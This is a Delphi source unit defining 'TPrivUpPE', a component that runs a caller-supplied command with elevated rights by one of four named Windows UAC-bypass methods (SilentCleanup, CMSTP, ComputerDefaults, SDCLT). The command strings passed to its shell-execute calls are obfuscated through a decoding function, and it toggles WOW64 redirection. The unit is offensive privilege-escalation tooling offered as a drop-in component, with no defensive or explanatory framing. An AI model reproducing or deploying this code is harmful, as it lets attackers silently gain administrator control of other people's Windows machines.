unit PrivUpPE;

interface

uses GetLibModHandlePE, CodeUnitPE, System.Classes;

type
  TMethodEx = ( SilentCleanup, CMSTP, ComputerDefaults, SDCLT );
  TPrivUpPE = class(TComponent)

private
  FCommand: String;
  FMethod: TMethodEx;
  procedure SetMethod(Value: TMethodEx);
  function GetMethod: TMethodEx;
protected
public
  constructor Create(AOwner: TComponent); override;
  destructor Destroy; override;
  procedure Execute;

published
  property FileName: string read FCommand write FCommand;
  property Method: TMethodEx read GetMethod write SetMethod;

end;

procedure Register;

implementation

constructor TPrivUpPE.Create(AOwner:TComponent);
begin
  inherited Create(AOwner);
end;

destructor TPrivUpPE.Destroy;
begin
  inherited;
end;

function TPrivUpPE.GetMethod: TMethodEx;
begin
  Result := FMethod;
end;

procedure TPrivUpPE.SetMethod(Value: TMethodEx);
begin
  FMethod := Value;
end;

procedure TPrivUpPE.Execute;
var
  WT: LongBool;
begin
  if FMethod = SilentCleanup then
  begin
    WoW1(WT);
    SEW($00, '',
      PChar(string(HATS(HCOM))),
      PChar(string(HATS(HCOM1))+FCommand+string(HATS(HCOM2))),
      '', $00);
    WoW2(WT);
  end
  else if FMethod = CMSTP then
  begin
    WoW1(WT);
    SEW($00, '',
        PChar(string(HATS(HCOM))),
        PChar(string(HATS(HCOM1111))+FCommand+string(HATS(HCOM2222))+
        string(HATS(HCOM3333))+string(HATS(HCOM4444))+string(HATS(HCOM5555))),
        '', $00);
    WoW2(WT);
  end
  else if FMethod = ComputerDefaults then
  begin
    WoW1(WT);
    SEW($00, '',
        PChar(string(HATS(HCOM))),
        PChar(string(HATS(HCOM111))+FCommand+string(HATS(HCOM222))),
        '', $00);
    Wow2(WT);
  end
  else if FMethod = SDCLT then
  begin
    Wow1(WT);
    SEW($00, '',
        PChar(string(HATS(HCOM))),
        PChar(string(HATS(HCOM11))+FCommand+string(HATS(HCOM22))),
        '', $00);
    Wow2(WT);
  end;
end;

procedure Register;
begin
  RegisterComponents('ZERO COM', [TPrivUpPE]);
end;

end.